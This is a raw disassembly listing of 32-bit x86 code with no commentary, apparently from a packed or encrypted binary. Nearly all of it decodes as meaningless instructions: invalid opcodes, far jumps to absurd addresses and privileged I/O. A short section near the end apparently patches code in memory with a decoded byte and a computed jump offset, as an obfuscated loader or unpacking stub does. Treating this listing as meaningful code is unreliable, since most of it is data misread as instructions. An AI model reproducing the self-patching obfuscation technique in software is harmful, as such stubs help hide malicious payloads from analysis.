  4030d1:	repz pop esi
  4030d3:	push   ecx
  4030d4:	or     ebp,DWORD PTR [ebx-0x70b05af9]
  4030da:	push   ss
  4030db:	imul   ebp,DWORD PTR [edi+esi*4-0x43b311d],0xb9cd62a1
  4030e6:	mov    esp,0xaabed0bf
  4030eb:	add    esp,DWORD PTR [esi]
  4030ed:	sub    al,0xdf
  4030ef:	retf   
  4030f0:	jmp    0x35dcec5d
  4030f5:	fimul  WORD PTR [edx]
  4030f7:	push   ds
  4030f8:	test   eax,0x9953247
  4030fd:	aam    0x6c
  4030ff:	mov    eax,ds:0x9b656ddd
  403104:	mov    WORD PTR [esi-0x2da90aa8],es
  40310a:	mov    DWORD PTR [ebx+0x2bdaaf62],ecx
  403110:	outs   dx,DWORD PTR ds:[esi]
  403111:	jecxz  0x403150
  403113:	cs pop ecx
  403115:	jl     0x403152
  403117:	popa   
  403118:	pusha  
  403119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40311a:	lahf   
  40311b:	and    eax,0xa4461015
  403120:	and    al,0xe9
  403122:	cmp    dh,BYTE PTR [ebp+0xf]
  403125:	leave  
  403126:	imul   ebx,esp,0xffffffc9
  403129:	lock push es
  40312b:	jge    0x40319b
  40312d:	inc    esp
  40312e:	cli    
  40312f:	push   ds
  403130:	stos   BYTE PTR es:[edi],al
  403131:	jmp    0x4030c8
  403133:	pop    esi
  403134:	stos   DWORD PTR es:[edi],eax
  403135:	push   ebx
  403136:	into   
  403137:	ficomp WORD PTR [esi]
  403139:	xor    edx,0x43411fc3
  40313f:	mov    bh,0x17
  403141:	cmp    eax,0x3657c107
  403146:	sbb    DWORD PTR ds:0x5b193ca,0xbb329efe
  403150:	daa    
  403151:	test   DWORD PTR [edi+ecx*8-0x5f],esi
  403155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403156:	call   0x62c9:0xee66cbda
  40315d:	fstp   QWORD PTR [ebx]
  40315f:	adc    ecx,eax
  403161:	fistp  DWORD PTR [ecx+eiz*2+0x2e6a65cf]
  403168:	push   edi
  403169:	std    
  40316a:	lea    esi,[esi]
  40316c:	cmp    al,0xb9
  40316e:	xchg   edi,eax
  40316f:	fmulp  st(7),st
  403171:	mov    ds:0x3d465907,eax
  403176:	push   0x2c
  403178:	fdivr  DWORD PTR [ecx+0x3a]
  40317b:	shl    BYTE PTR [eax+0x2f],0xcd
  40317f:	jg     0x40318f
  403181:	pop    edi
  403182:	mov    edi,0x7036609d
  403187:	imul   ebx,DWORD PTR [bx-0x44],0xfffffff3
  40318c:	shl    ecx,0xc8
  40318f:	cwde   
  403190:	clc    
  403191:	jns    0x40314f
  403193:	cld    
  403194:	push   cs
  403195:	xor    ebx,DWORD PTR [edx+eiz*1+0x36]
  403199:	or     dl,BYTE PTR [ebx+0xffca8ce]
  40319f:	cli    
  4031a0:	lds    edx,FWORD PTR [edi]
  4031a2:	xor    BYTE PTR [ecx],al
  4031a4:	(bad)  
  4031a5:	inc    DWORD PTR [edi-0x65]
  4031a8:	jb     0x403201
  4031aa:	fild   DWORD PTR [ebx+0x16f72e74]
  4031b0:	and    BYTE PTR [ecx+0x203d9958],0xaa
  4031b7:	add    DWORD PTR [ebp+0x13],edx
  4031ba:	ja     0x40317d
  4031bc:	retf   
  4031bd:	xchg   esp,eax
  4031be:	dec    eax
  4031bf:	mov    dh,0xe0
  4031c1:	scas   al,BYTE PTR es:[edi]
  4031c2:	test   ah,al
  4031c4:	in     eax,0x53
  4031c6:	jo     0x403196
  4031c8:	jmp    0x96423344
  4031cd:	(bad)  
  4031ce:	rcl    BYTE PTR [edi+ecx*2-0x57],0xac
  4031d3:	ja     0x403173
  4031d5:	stos   DWORD PTR es:[edi],eax
  4031d6:	jo     0x4031c9
  4031d8:	lock inc edx
  4031da:	test   al,0x9d
  4031dc:	sub    ebx,ecx
  4031de:	cs dec ebx
  4031e0:	xor    al,0x1e
  4031e2:	xchg   ecx,eax
  4031e3:	add    eax,0xe2aae378
  4031e8:	mov    esp,0x39fa7d23
  4031ed:	call   0x1e3b1cce
  4031f2:	lds    edx,FWORD PTR [ebp+0x1a7fc8a3]
  4031f8:	shr    DWORD PTR [eax-0x4964e04],0x96
  4031ff:	ja     0x403233
  403201:	pop    edx
  403202:	xchg   ebp,eax
  403203:	test   eax,0x812b3f13
  403208:	push   0x5b5eb6a3
  40320d:	in     al,dx
  40320e:	dec    esi
  40320f:	or     al,0x2b
  403211:	popa   
  403212:	lods   eax,DWORD PTR ds:[esi]
  403213:	lea    edx,[edx]
  403215:	int3   
  403216:	push   0xdcecf10
  40321b:	imul   ebx,DWORD PTR [ecx+0x6a],0xffffffb8
  40321f:	(bad)  
  403220:	cdq    
  403221:	cli    
  403222:	mov    dl,0x43
  403224:	dec    eax
  403225:	mov    esp,0x46dde013
  40322a:	lea    edi,[edx-0x38]
  40322d:	inc    ecx
  40322e:	stos   BYTE PTR es:[edi],al
  40322f:	pushf  
  403230:	adc    eax,DWORD PTR [esi+edx*2+0x76]
  403234:	lds    esi,FWORD PTR [ecx+edi*2+0x5a]
  403238:	mov    ah,0xb8
  40323a:	out    dx,eax
  40323b:	mov    eax,ds:0x4aaacaa7
  403240:	pop    ebx
  403241:	xor    DWORD PTR [eax+0x418e99b6],0xffffffb5
  403248:	sar    BYTE PTR [ecx],1
  40324a:	sub    al,0x46
  40324c:	arpl   WORD PTR [edi-0x291994d8],si
  403252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403253:	mov    ecx,0x16c6146d
  403258:	cmp    DWORD PTR [edi+0xd],0xa11b6c08
  40325f:	cmp    al,cl
  403261:	cmp    al,0x42
  403263:	loope  0x4032b0
  403265:	cli    
  403266:	scas   al,BYTE PTR es:[edi]
  403267:	cmp    edx,ebx
  403269:	hlt    
  40326a:	iret   
  40326b:	test   BYTE PTR [ecx],bl
  40326d:	lahf   
  40326e:	add    ah,BYTE PTR [ebx+0x28]
  403271:	out    dx,al
  403272:	rol    DWORD PTR [ecx+0x62],1
  403275:	jmp    0x40321b
  403277:	inc    ebx
  403278:	arpl   WORD PTR gs:[eax],sp
  40327b:	or     DWORD PTR [esi+ebp*1+0x30],ebp
  40327f:	lahf   
  403280:	mov    dl,0x9c
  403282:	fwait
  403283:	dec    eax
  403284:	sbb    eax,0xe17ce06e
  403289:	mov    cl,0x8a
  40328b:	push   esp
  40328c:	cmp    al,0x21
  40328e:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403290:	loop   0x40323e
  403292:	jbe    0x403219
  403294:	pusha  
  403295:	jl     0x403222
  403297:	repnz stos DWORD PTR es:[edi],eax
  403299:	lock test DWORD PTR [edi-0xf],esi
  40329d:	cli    
  40329e:	cmp    DWORD PTR [edi-0x1d733667],edx
  4032a4:	dec    esp
  4032a5:	popf   
  4032a6:	sti    
  4032a7:	pop    ss
  4032a8:	push   ebp
  4032a9:	xor    BYTE PTR [ebx-0x66],0x5d
  4032ad:	xchg   esp,eax
  4032ae:	not    DWORD PTR [ebx-0x22]
  4032b1:	rcl    BYTE PTR [ebp+0x3216cef7],1
  4032b7:	push   0x64b3ae80
  4032bc:	jge    0x403331
  4032be:	lock or DWORD PTR [esp+eax*1-0x26abca72],ebx
  4032c6:	xor    eax,0x69c83a8b
  4032cb:	mov    eax,0x55b692aa
  4032d0:	mov    ebx,0x5190004e
  4032d5:	inc    esp
  4032d6:	addps  xmm2,XMMWORD PTR [edi-0x64]
  4032da:	pop    eax
  4032db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032dc:	adc    al,0x93
  4032de:	aaa    
  4032df:	icebp  
  4032e0:	adc    BYTE PTR [ecx],bl
  4032e2:	add    bl,BYTE PTR [ebx-0x2f]
  4032e5:	in     eax,dx
  4032e6:	inc    edi
  4032e7:	push   ds
  4032e8:	js     0x403288
  4032ea:	mov    cl,BYTE PTR [edi+0x55d4a9eb]
  4032f0:	out    0x10,al
  4032f2:	(bad)  
  4032f3:	aaa    
  4032f4:	inc    ecx
  4032f5:	sub    BYTE PTR [edx],0xce
  4032f8:	les    edx,FWORD PTR [esi-0x3c]
  4032fb:	push   esi
  4032fc:	bound  edi,QWORD PTR [edx+0x46]
  4032ff:	mov    edi,DWORD PTR [edi-0x3dd0e72b]
  403305:	xchg   esi,eax
  403306:	out    dx,eax
  403307:	add    BYTE PTR [eax],bl
  403309:	shr    DWORD PTR [esi],1
  40330b:	stos   BYTE PTR es:[edi],al
  40330c:	and    bh,BYTE PTR [edi-0x25b21291]
  403312:	push   eax
  403313:	cs ror dl,cl
  403316:	mov    edx,0xdc0fc7ac
  40331b:	call   0xea48:0x2afdf054
  403322:	outs   dx,BYTE PTR ds:[esi]
  403323:	push   0xbe27674c
  403328:	sub    eax,0x6f43c7c0
  40332d:	mov    esi,gs
  40332f:	pop    ebp
  403330:	sub    dl,cl
  403332:	in     eax,0xa
  403334:	int    0xb9
  403336:	add    al,0xf0
  403338:	ret    
  403339:	xchg   esp,eax
  40333a:	cwde   
  40333b:	jnp    0x403313
  40333d:	stc    
  40333e:	jne    0x4032ca
  403340:	sti    
  403341:	mov    dl,0x77
  403343:	in     al,dx
  403344:	or     eax,0x39353e20
  403349:	xchg   esp,eax
  40334a:	push   es
  40334b:	ret    
  40334c:	fidiv  WORD PTR [eax+ecx*4]
  40334f:	setle  BYTE PTR [esi-0x1f77a772]
  403356:	not    BYTE PTR [edx+0x63]
  403359:	jle    0x403304
  40335b:	ret    0x5ee5
  40335e:	sub    eax,0xb69f57
  403363:	push   ebp
  403364:	add    al,0x93
  403366:	xchg   ebx,eax
  403367:	sub    eax,0xe232d4f5
  40336c:	ins    BYTE PTR es:[edi],dx
  40336d:	xchg   edi,eax
  40336e:	jle    0x403317
  403370:	jo     0x4032f9
  403372:	inc    ecx
  403373:	imul   ebx,DWORD PTR [ecx+0x7e1a5232],0xffffff84
  40337a:	adc    eax,0x82976624
  40337f:	mov    BYTE PTR [edx+0x2bc142b2],cl
  403385:	push   cs
  403386:	push   ebp
  403387:	jge    0x4033bf
  403389:	sti    
  40338a:	pop    ecx
  40338b:	mov    al,0x1c
  40338d:	or     al,0x1
  40338f:	and    DWORD PTR [edx-0x40],eax
  403392:	mov    esi,0xc2e602f
  403397:	cs xor al,0x53
  40339a:	push   0x66
  40339c:	popa   
  40339d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40339e:	js     0x403380
  4033a0:	xchg   edi,eax
  4033a1:	loope  0x4033aa
  4033a3:	pop    es
  4033a4:	stos   DWORD PTR es:[edi],eax
  4033a5:	adc    DWORD PTR [edi+0x5e32a034],ebp
  4033ab:	mov    cl,0xd1
  4033ad:	je     0x40340c
  4033af:	fidiv  WORD PTR [ecx-0x1ed2eace]
  4033b5:	pushf  
  4033b6:	lock int 0xa3
  4033b9:	imul   esp,esp,0xda49197
  4033bf:	xchg   esi,eax
  4033c0:	leave  
  4033c1:	js     0x40337f
  4033c3:	or     dh,bl
  4033c5:	fwait
  4033c6:	out    dx,al
  4033c7:	int    0xa9
  4033c9:	mov    edi,DWORD PTR [eax+ecx*2-0x53d1b52e]
  4033d0:	push   ebp
  4033d1:	sub    cl,ch
  4033d3:	inc    edx
  4033d4:	xchg   esp,eax
  4033d5:	mov    DWORD PTR [edx-0x21],0x75fe9ca1
  4033dc:	jnp    0x403387
  4033de:	mov    edi,edx
  4033e0:	shl    DWORD PTR [esi],cl
  4033e2:	jmp    0xd890:0x6a850546
  4033e9:	mov    cl,0x29
  4033eb:	or     ebp,ebp
  4033ed:	int    0x5a
  4033ef:	adc    bl,ch
  4033f1:	ins    DWORD PTR es:[edi],dx
  4033f2:	fisttp QWORD PTR [ecx]
  4033f4:	cmp    eax,DWORD PTR [ebx-0x44]
  4033f7:	lea    edi,[esi+0x65]
  4033fa:	les    eax,FWORD PTR [ecx+ecx*2]
  4033fd:	add    ecx,esi
  4033ff:	push   cs
  403400:	cmp    al,0x55
  403402:	(bad)  
  403403:	aas    
  403404:	and    al,0x69
  403406:	push   ecx
  403407:	fild   WORD PTR [edi-0x39]
  40340a:	cs jl  0x403444
  40340d:	clc    
  40340e:	lds    eax,FWORD PTR [esi+ebx*4-0x1]
  403412:	jl     0x40343a
  403414:	pop    ebp
  403415:	inc    eax
  403416:	jge    0x4033cf
  403418:	(bad)  
  403419:	push   cs
  40341a:	add    eax,0x25edd07a
  40341f:	fiadd  WORD PTR [ecx+eiz*2-0x740e385]
  403426:	or     DWORD PTR [eax-0x74da071e],esi
  40342c:	dec    ebp
  40342d:	xor    DWORD PTR [edi+edi*2-0x5fde1312],eax
  403434:	inc    edi
  403435:	fcmovne st,st(3)
  403437:	adc    esi,DWORD PTR [edx-0xd1d9cf0]
  40343d:	in     al,0x9
  40343f:	shl    BYTE PTR [ebx],1
  403441:	inc    eax
  403442:	push   cs
  403443:	pop    edi
  403444:	inc    esi
  403445:	shr    BYTE PTR [edi+0x60bd51fc],1
  40344b:	(bad)  
  40344c:	shl    BYTE PTR [eax+esi*8+0x7afb57c5],cl
  403453:	and    esi,DWORD PTR [ecx]
  403455:	std    
  403456:	arpl   WORD PTR [ecx],sp
  403458:	cmp    eax,0x6d571ad3
  40345d:	bound  ecx,QWORD PTR [esi-0x5a]
  403460:	in     al,dx
  403461:	cmp    eax,0x3d8ad4e1
  403466:	sub    esi,DWORD PTR ds:0xe170a02
  40346c:	and    al,0xf6
  40346e:	clc    
  40346f:	jp     0x4034c7
  403471:	push   0x521c275a
  403476:	test   al,0xfa
  403478:	pop    ecx
  403479:	xchg   esp,eax
  40347a:	xor    eax,0x6e3dc411
  40347f:	in     al,0xcb
  403481:	ss push edx
  403483:	bound  esi,QWORD PTR [ebx]
  403485:	je     0x4034f2
  403487:	jb     0x403415
  403489:	jg     0x4034f2
  40348b:	mov    edi,0xeb69e877
  403490:	add    eax,ebp
  403492:	cmp    BYTE PTR [ecx-0x70],0xbe
  403496:	xchg   DWORD PTR ds:0x79c58ae3,esi
  40349c:	ret    
  40349d:	sbb    al,0xc6
  40349f:	sub    ecx,DWORD PTR [esi+0x36]
  4034a2:	(bad)  [edi+0x4e]
  4034a5:	repnz mov bl,dh
  4034a8:	or     eax,esp
  4034aa:	and    esp,ebx
  4034ac:	and    DWORD PTR [eax],edx
  4034ae:	(bad)  
  4034af:	nop
  4034b0:	jbe    0x403435
  4034b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b3:	mov    edi,0x49263451
  4034b8:	add    esi,DWORD PTR [edi+0x0]
  4034bb:	inc    esp
  4034bc:	ja     0x4034d0
  4034be:	mov    ebx,DWORD PTR [edx+ecx*4-0x54]
  4034c2:	mov    ds:0x2c7aa6a,al
  4034c7:	into   
  4034c8:	inc    ebx
  4034c9:	mov    BYTE PTR [ebp+0x113d0b],cl
  4034cf:	sub    BYTE PTR [ecx],bh
  4034d1:	shl    BYTE PTR [edx+ecx*8-0x1d1969a8],cl
  4034d8:	mov    DWORD PTR [esi],0x37759c67
  4034de:	inc    edx
  4034df:	sub    ch,BYTE PTR [esi-0x5c]
  4034e2:	jbe    0x40347d
  4034e4:	or     bh,BYTE PTR [ebx+0x1a]
  4034e7:	push   ebx
  4034e8:	adc    ch,BYTE PTR [ecx+0x5c770806]
  4034ee:	mov    esp,DWORD PTR [edi+0x2b96aac5]
  4034f4:	cs loope 0x403571
  4034f7:	shl    DWORD PTR [ebx+esi*1],cl
  4034fa:	aam    0xbe
  4034fc:	xchg   ebx,eax
  4034fd:	xchg   ah,ah
  4034ff:	popa   
  403500:	out    0x1e,eax
  403502:	cmp    DWORD PTR [eax+ecx*4-0x2975611d],edi
  403509:	pop    ss
  40350a:	std    
  40350b:	jo     0x403504
  40350d:	dec    ebx
  40350e:	dec    ebp
  40350f:	dec    edi
  403510:	idiv   BYTE PTR [edi+0x75d3b5f0]
  403516:	sub    ch,BYTE PTR [edx-0x48]
  403519:	fidiv  WORD PTR [eax]
  40351b:	or     eax,0x5e23ae12
  403520:	jl     0x403552
  403522:	jo     0x4035a0
  403524:	retf   0xe689
  403527:	mov    ebx,0x115aeb0d
  40352c:	and    al,0xde
  40352e:	push   esi
  40352f:	sbb    DWORD PTR cs:[ecx+eax*1-0x1d],esp
  403534:	(bad)  
  403535:	xor    eax,DWORD PTR [edi+0xf611fca]
  40353b:	xchg   ecx,eax
  40353c:	(bad)  
  40353d:	shr    BYTE PTR [eax+0x3e988e80],1
  403543:	mov    ebx,0x9181c56
  403548:	xchg   ebx,eax
  403549:	mov    ecx,0x933ea937
  40354e:	retf   0x47fe
  403551:	into   
  403552:	jmp    0xce7a:0x9f1d437c
  403559:	inc    DWORD PTR [edx]
  40355b:	jl     0x40357d
  40355d:	ror    BYTE PTR [ecx+0xf31baf7],1
  403563:	popa   
  403564:	fist   DWORD PTR [ecx-0x5]
  403567:	dec    ebx
  403568:	pushf  
  403569:	loope  0x40359f
  40356b:	adc    BYTE PTR [ebx+0x3c3a6712],bh
  403571:	icebp  
  403572:	mov    dh,0xc0
  403574:	and    dl,dh
  403576:	std    
  403577:	cmp    al,0x5b
  403579:	test   DWORD PTR [edx-0x6b],edx
  40357c:	test   eax,0x371297b5
  403581:	inc    ecx
  403582:	imul   esp,eax,0x1208c649
  403588:	lock popa 
  40358a:	loope  0x40355f
  40358c:	aas    
  40358d:	setnp  BYTE PTR [eax]
  403590:	pop    ss
  403591:	mov    ebp,0x5d0b5588
  403596:	push   ecx
  403597:	mov    ah,0x6e
  403599:	cmp    bh,BYTE PTR [esi-0x56]
  40359c:	inc    ebp
  40359d:	jns    0x4035c6
  40359f:	call   0x680f14c3
  4035a4:	rcr    BYTE PTR [edx+edx*1+0x18dcaf29],0x91
  4035ac:	jnp    0x4035be
  4035ae:	rcr    DWORD PTR [ebx+0x62],1
  4035b1:	jb     0x4035f2
  4035b3:	vpunpckhqdq xmm4,xmm6,XMMWORD PTR [edx+0x21e96ade]
  4035bb:	pop    ds
  4035bc:	loop   0x4035ca
  4035be:	inc    edi
  4035bf:	add    cl,BYTE PTR [esi+0x211ff831]
  4035c5:	mov    ah,0x56
  4035c7:	mov    edx,0x63a6fd80
  4035cc:	inc    eax
  4035cd:	or     al,0xc9
  4035cf:	jbe    0x4035e0
  4035d1:	(bad)  
  4035d2:	and    ebp,DWORD PTR [esi-0x4539f56]
  4035d8:	cmp    eax,0xae62670c
  4035dd:	dec    edx
  4035de:	jne    0x403561
  4035e0:	stc    
  4035e1:	push   edx
  4035e2:	push   es
  4035e3:	arpl   WORD PTR [bp+si-0x7366],bp
  4035e8:	jnp    0x4035c2
  4035ea:	adc    al,0x4b
  4035ec:	push   edx
  4035ed:	adc    al,0x97
  4035ef:	inc    ebx
  4035f0:	and    dh,dl
  4035f2:	lods   eax,DWORD PTR ds:[esi]
  4035f3:	or     edx,DWORD PTR [esi]
  4035f5:	dec    ecx
  4035f6:	dec    esp
  4035f7:	pop    edi
  4035f8:	std    
  4035f9:	jmp    0xa439:0x2cd1fe45
  403600:	jmp    0x78e4a75a
  403605:	push   0xa6f04463
  40360a:	and    BYTE PTR [ebp-0x3cc250f3],0xd3
  403611:	sub    DWORD PTR [esi],0xd811f758
  403617:	inc    eax
  403618:	mov    WORD PTR [ebx-0x1e],?
  40361b:	test   al,0x2f
  40361d:	pop    es
  40361e:	lods   al,BYTE PTR ds:[esi]
  40361f:	jge    0x4035b3
  403621:	xchg   ebp,eax
  403622:	cmp    ebx,esp
  403624:	call   0x210:0x470fbe23
  40362b:	mov    ds:0xe938440b,al
  403630:	xchg   edx,eax
  403631:	call   FWORD PTR [esi]
  403633:	(bad)  
  403635:	stos   DWORD PTR es:[edi],eax
  403636:	ja     0x40361a
  403638:	push   0x6e3d59ac
  40363d:	ficomp WORD PTR [esi-0x7f]
  403640:	inc    eax
  403641:	xor    DWORD PTR ds:0x7cff79af,esi
  403647:	lods   al,BYTE PTR ds:[esi]
  403648:	push   ss
  403649:	(bad)
  40364d:	lahf   
  40364e:	mov    eax,0xf4595596
  403653:	cmp    ah,BYTE PTR [ebx+0xd]
  403656:	xor    ah,0x95
  403659:	aas    
  40365a:	and    ebx,DWORD PTR [ebp+0x7c9c7b38]
  403660:	and    al,0x3c
  403662:	loope  0x403682
  403664:	dec    edi
  403665:	clc    
  403666:	out    dx,al
  403667:	sub    ch,BYTE PTR [edx-0xa998c85]
  40366d:	dec    esi
  40366e:	imul   esi,DWORD PTR [esi+eiz*2-0xae179f5],0xffffff9b
  403676:	iret   
  403677:	retf   
  403678:	bnd cs jnp 0x403644
  40367c:	sahf   
  40367d:	js     0x40367d
  40367f:	pop    ecx
  403680:	and    eax,ecx
  403682:	pop    ss
  403683:	jnp    0x4036e3
  403685:	and    ecx,ecx
  403687:	sbb    eax,0x354f21c7
  40368c:	inc    edi
  40368d:	inc    esp
  40368e:	mov    gs:0x7cf11bfe,al
  403694:	icebp  
  403695:	sar    edx,cl
  403697:	loop   0x403657
  403699:	int    0x43
  40369b:	dec    ebp
  40369c:	inc    ecx
  40369d:	in     eax,0x8c
  40369f:	push   ebx
  4036a0:	or     eax,0x72ad0067
  4036a5:	cdq    
  4036a6:	or     al,0xc5
  4036a8:	mov    BYTE PTR [eax],bh
  4036aa:	ret    
  4036ab:	lock jne 0x403652
  4036ae:	dec    ebp
  4036af:	sbb    BYTE PTR [esp+ebx*4-0x63],0x1e
  4036b4:	popf   
  4036b5:	fucom  st(3)
  4036b7:	out    0xf8,al
  4036b9:	out    dx,eax
  4036ba:	add    BYTE PTR [ebp+0x5eb8707f],al
  4036c0:	gs int3 
  4036c2:	ffreep st(2)
  4036c4:	aad    0xcf
  4036c6:	loop   0x403715
  4036c8:	dec    edi
  4036c9:	cli    
  4036ca:	call   0x6d797c54
  4036cf:	pop    edi
  4036d0:	les    edi,FWORD PTR [eax+0x3c]
  4036d3:	push   ebp
  4036d4:	stos   BYTE PTR es:[edi],al
  4036d5:	mov    ah,0xb5
  4036d7:	outs   dx,DWORD PTR ds:[esi]
  4036d8:	pop    edi
  4036d9:	fistp  QWORD PTR ds:0xfe3ac029
  4036df:	popa   
  4036e0:	or     DWORD PTR [eax+eiz*4+0x64ffad64],0xffffffb0
  4036e8:	mov    cl,0x63
  4036ea:	mov    DWORD PTR ds:0x2fb3974f,edx
  4036f0:	push   0xffffff8a
  4036f2:	in     al,0xfa
  4036f4:	cs cdq 
  4036f6:	call   0x8c836c1e
  4036fb:	fild   QWORD PTR [edi+0x72d50243]
  403701:	cmp    al,0xa4
  403703:	icebp  
  403704:	and    eax,DWORD PTR [ebp+edi*4+0x1b8249d9]
  40370b:	in     al,dx
  40370c:	ins    DWORD PTR es:[edi],dx
  40370d:	pop    es
  40370e:	jmp    0x403721
  403710:	push   ecx
  403711:	vcvtss2sd xmm5,xmm6,xmm3
  403715:	jne    0x403759
  403717:	push   ds
  403718:	lods   eax,DWORD PTR ds:[esi]
  403719:	mov    bl,0x73
  40371b:	test   eax,0x99470ff0
  403720:	dec    edi
  403721:	sub    al,0x79
  403723:	imul   edx,ebp,0xfee3c265
  403729:	or     BYTE PTR [esi+0xc],cl
  40372c:	jmp    0x9159ef32
  403731:	push   0x38
  403733:	jo     0x4036d4
  403735:	retf   
  403736:	rol    DWORD PTR [ebx-0x28],0x6d
  40373a:	ss or  bh,bl
  40373d:	adc    BYTE PTR [esi+0x3e],ah
  403740:	adc    eax,0x5068dca2
  403745:	push   ds
  403746:	nop
  403747:	push   ebx
  403748:	inc    ebx
  403749:	lods   eax,DWORD PTR ds:[esi]
  40374a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40374b:	icebp  
  40374c:	bound  ebx,QWORD PTR fs:[eax]
  40374f:	adc    eax,DWORD PTR [ebp-0x32]
  403752:	jnp    0x4037c3
  403754:	mov    ds:0x2b1e8d23,al
  403759:	push   ecx
  40375a:	lods   al,BYTE PTR ds:[esi]
  40375b:	cmp    ecx,DWORD PTR [ebx+ebx*4-0x71]
  40375f:	lea    edx,[ebx-0x2c44df73]
  403765:	into   
  403766:	pop    ds
  403767:	push   ds
  403768:	xchg   ecx,eax
  403769:	pop    es
  40376a:	dec    edi
  40376b:	or     eax,0x81eff1c8
  403770:	sub    al,0x2c
  403772:	cli    
  403773:	inc    esp
  403774:	scas   al,BYTE PTR es:[edi]
  403775:	ret    0x88e4
  403778:	outs   dx,DWORD PTR ds:[esi]
  403779:	jg     0x4037c6
  40377b:	mov    bl,0x5e
  40377d:	jo     0x403775
  40377f:	and    eax,0xbfd8c0c8
  403784:	add    ecx,DWORD PTR [esi]
  403786:	push   ds
  403787:	ret    
  403788:	mov    eax,ds:0xa4ede840
  40378d:	test   DWORD PTR [esp+edi*4],esp
  403790:	ja     0x40379a
  403792:	dec    esp
  403793:	test   al,0x7a
  403795:	adc    ebx,DWORD PTR [esi+0x1f92d57f]
  40379b:	test   eax,0x4ed365e4
  4037a0:	add    BYTE PTR [ecx-0x28],0x40
  4037a4:	adc    ch,bl
  4037a6:	jle    0x40381a
  4037a8:	adc    edx,esi
  4037aa:	xor    DWORD PTR cs:[ecx-0x1cbb393a],esp
  4037b1:	mov    al,ds:0x1d2c380
  4037b6:	(bad)  
  4037b7:	les    eax,FWORD PTR [ebx-0x66]
  4037ba:	adc    DWORD PTR [ebx],ecx
  4037bc:	fistp  DWORD PTR [ebp-0x5a353337]
  4037c2:	dec    edi
  4037c3:	jbe    0x4037e6
  4037c5:	push   0x5f
  4037c7:	rcl    BYTE PTR [esi+0x14],0x82
  4037cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037cc:	js     0x4037aa
  4037ce:	test   esi,0x8cd672b1
  4037d4:	push   ss
  4037d5:	icebp  
  4037d6:	sbb    BYTE PTR [ebx+0x20],bl
  4037d9:	shl    DWORD PTR [edx+0x32],0x7
  4037dd:	cmp    ebx,DWORD PTR [ebx-0x28bd8989]
  4037e3:	add    al,0xba
  4037e5:	jl     0x403860
  4037e7:	jle    0x403787
  4037e9:	and    ebp,DWORD PTR [ebp-0x17fcd145]
  4037ef:	outs   dx,DWORD PTR ds:[esi]
  4037f0:	jbe    0x4037f3
  4037f2:	add    BYTE PTR [ebp+0x2b840fc0],al
  4037f8:	add    BYTE PTR [eax],al
  4037fa:	add    BYTE PTR [ebp-0x8f7b],cl
  403800:	call   DWORD PTR [eax-0x75]
  403803:	inc    ebp
  403804:	shl    BYTE PTR [ebx],1
  403806:	mov    BYTE PTR [ebx],0xc7
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fs fdivr st(0),st
  40389a:	(bad)  
  40389b:	inc    dh
  40389d:	fstp   QWORD PTR [edi+0x62]
  4038a0:	(bad)  
  4038a1:	fstp   QWORD PTR [edi+0x62]
  4038a4:	bound  esp,QWORD PTR [eax+0x2a]
  4038a7:	and    DWORD PTR [eax-0x1d346e10],eax
  4038ad:	ss and al,bl
  4038b0:	loope  0x403911
  4038b2:	test   DWORD PTR [ecx+0x271b8620],0xb2179c07
  4038bc:	or     ch,bh
  4038be:	mov    edi,0xa252f611
  4038c3:	inc    ebx
  4038c4:	sbb    al,0xeb
  4038c6:	iret   
  4038c7:	mov    eax,ds:0xcc213192
  4038cc:	mov    ah,dh
  4038ce:	jecxz  0x403927
  4038d0:	dec    edx
  4038d1:	fild   DWORD PTR [ebx-0x4b]
  4038d4:	cmp    DWORD PTR [ebx-0x6c4a9ffb],0x450b2688
  4038de:	dec    edi
  4038df:	icebp  
  4038e0:	and    eax,0x8c20fa16
